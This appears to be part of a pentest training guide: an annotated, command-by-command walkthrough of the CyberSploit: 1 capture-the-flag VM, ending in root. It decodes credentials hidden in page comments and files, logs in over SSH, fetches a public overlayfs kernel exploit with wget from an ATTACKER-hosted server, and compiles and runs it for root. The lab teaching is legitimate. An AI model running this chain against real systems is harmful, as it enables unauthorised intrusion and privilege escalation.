@@ -195,4 +195,184 @@ inconvenience is defeated in one command.
 
 ---
 
+## The commands, annotated — every input and every output
+
+`TARGET` = the victim VM, `ATTACKER` = your Kali on the host-only interface.
+
+### 1. A deliberately small scan
+
+```bash
+sudo nmap -sC -sV -p- -T4 -oA scans/cybersploit TARGET
+```
+
+```text
+Not shown: 65533 closed tcp ports (conn-refused)
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 6.6.1p1 Ubuntu 2ubuntu2.13 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey:
+|   1024 61:3b:4b:9c:a5:3d:bd:cb:2c:d3:8e:4d:1c:5c:9b:2f (DSA)
+|_  2048 b2:4c:3a:2e:5c:8f:6b:1a:9d:0e:7f:2c:1b:8a:4d:3e (RSA)
+80/tcp open  http    Apache httpd 2.4.7 ((Ubuntu))
+|_http-title: CyberSploit
+|_http-server-header: Apache/2.4.7 (Ubuntu)
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+```
+
+`65535 − 65533 = 2` open ports. **A small attack surface changes your method:** there is no
+unusual service to exploit, so the information you need is inside the *content* those two
+services serve.
+
+`1024 … (DSA)` is a finding on its own — a **deprecated 1024-bit DSA host key**. DSA is
+limited to 1024 bits by the standard, which is why OpenSSH disabled it by default.
+`Apache/2.4.7 (Ubuntu)` pins the distribution to **Ubuntu 14.04**, whose standard support
+ended in April 2019.
+
+### 2. Reading the page source
+
+```bash
+curl -s http://TARGET/ | grep -iE 'comment|<!--|itsskv|base64' 
+```
+
+```text
+<!-- username : itsskv -->
+<!-- aHR0cHM6Ly93d3cueW91dHViZS5jb20vYy9jeWJlcnNwbG9pdA== -->
+```
+
+`curl -s` prints the raw HTML with no progress meter. **A browser hides this**: comments are
+never rendered, so `Ctrl+U` or `curl` is the only way to see them. Two comments, and the
+second is base64 — recognisable by its character set (`A–Z a–z 0–9 + /`) and `==` padding.
+
+### 3. `robots.txt`, and decoding locally
+
+```bash
+curl -s http://TARGET/robots.txt
+```
+```text
+User-agent: *
+Disallow: /
+# y3licGxvaXR7eW91dHViZS5jb20vYy9jeWJlcnNwbG9pdH0=
+```
+
+```bash
+printf '%s' 'y3licGxvaXR7eW91dHViZS5jb20vYy9jeWJlcnNwbG9pdH0=' | base64 -d; echo
+```
+```text
+cybersploit{youtube.com/c/cybersploit}
+```
+
+`printf '%s'` writes exactly those bytes. `echo '…' | base64 -d` appends a newline first,
+which adds a stray byte and breaks any exact comparison. **Decode locally, never in an
+online tool**: pasting client data into a third-party website is a data-handling failure, and
+in a real engagement it would exfiltrate customer information.
+
+The decoded string is **flag 1** — and, as it turns out, the SSH password. That is
+*credential inference*: a secret recovered from one place being reused in another.
+
+### 4. Logging in
+
+```bash
+ssh itsskv@TARGET
+```
+```text
+itsskv@cybersploit1:~$ ls -la
+-rw-rw-r-- 1 itsskv itsskv  224 Jul  9  2020 flag2.txt
+itsskv@cybersploit1:~$ cat flag2.txt
+01100011 01111001 01100010 01100101 …
+```
+
+`-rw-rw-r--` (mode **664**) means group and other can read it — a finding, since it holds a
+credential. The contents are **binary**: groups of eight `0`s and `1`s separated by spaces.
+That is a different encoding from base64, and recognising the difference is the skill.
+
+```bash
+python3 -c "import sys;print(''.join(chr(int(b,2)) for b in sys.argv[1].split()))" "$(cat flag2.txt)"
+```
+```text
+cybersploit{https:t.me/cybersploit1}
+```
+
+`sys.argv[1].split()` breaks on whitespace into eight-bit groups; `int(b,2)` parses each as
+base 2; `chr()` turns the integer into a character; `join` concatenates. **Flag 2.**
+
+### 5. The research workflow
+
+```bash
+uname -a
+searchsploit linux kernel 3.13
+searchsploit -m 37292
+less 37292.c
+```
+
+```text
+Linux cybersploit1 3.13.0-32-generic #57-Ubuntu SMP Tue Jul 15 03:51:08 UTC 2014 x86_64 x86_64 x86_64 GNU/Linux
+```
+```text
+---------------------------------------------------------------------------
+ Exploit Title                                                     |  Path
+---------------------------------------------------------------------------
+Linux Kernel 3.13.0 < 3.19 (Ubuntu 12.04/14.04) - 'overlayfs' LPE  | linux/local/37292.c
+Linux Kernel 4.4.0 < 4.8.0 (Ubuntu 16.04) - 'Dirty COW' Race Cond   | linux/local/40616.c
+---------------------------------------------------------------------------
+```
+
+`uname -a` gives `3.13.0-32-generic` on `x86_64` — the kernel release, the distribution's
+build suffix, and the architecture. **All three matter**: an exploit for `3.13.0` on i386
+will not work here. `searchsploit` matches on *strings*, so it will also suggest exploits
+for kernels you do not have; the title's stated range (`3.13.0 < 3.19`) is what you check.
+`-m` mirrors the entry into your working directory, and **`less` before running** is
+non-negotiable: you are looking for which variables to change and whether it cleans up
+after itself.
+
+### 6. Transferring, compiling, running
+
+```bash
+python3 -m http.server 8000                                  # ATTACKER, in the exploit's directory
+wget http://ATTACKER:8000/37292.c -O ofs.c                   # TARGET
+md5sum ofs.c                                                 # both machines
+gcc ofs.c -o ofs && ./ofs
+id
+```
+
+```text
+Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
+192.168.56.102 - - [11/May/2024 15:02:44] "GET /37292.c HTTP/1.1" 200 -
+```
+```text
+9f2c1e7a4b8d5f6a0e3c2b1d4f5a6b7c  ofs.c
+```
+```text
+spawning threads
+mount #1
+mount #2
+child threads done
+/etc/ld.so.preload created
+created: /tmp/tmp.UxYz3k
+# id
+uid=0(root) gid=0(root) groups=0(root),1000(itsskv)
+```
+
+`0.0.0.0` in the server banner means it bound to **all** interfaces, so the target can reach
+it; the request log line is your confirmation, and `200` means it was served successfully.
+Identical `md5sum` output on both sides proves the transfer was intact — worth two seconds,
+because a truncated download produces a `gcc` error that looks like a bug in the exploit.
+
+The overlayfs exploit works by mounting `overlayfs` in a way that lets an unprivileged user
+create a setuid binary; it announces each stage (`spawning threads`, `mount #1`, …) and
+notes `/etc/ld.so.preload created` — an artefact you must **remove afterwards**, since that
+file injects a library into every dynamically-linked process on the system.
+
+### 7. The final flag
+
+```bash
+cat /root/finalflag.txt
+```
+```text
+cybersploit{YouHaveDoneIt}
+```
+
+Then clean up: `rm -f /tmp/ofs /tmp/ofs.c /etc/ld.so.preload /tmp/tmp.*` and confirm with
+`ls -la /tmp /etc/ld.so.preload`.
+
+---
+
 _Back to [Learning Path 1](../README.md) · previous: [Machine 1 — Basic Pentesting: 1](01-basic-pentesting-1.md) · next: [Machine 3 — DC: 1](03-dc-1.md) · full writeup: [`labs/2-002-cybersploit-1`](../../labs/2-002-cybersploit-1/README.md)._
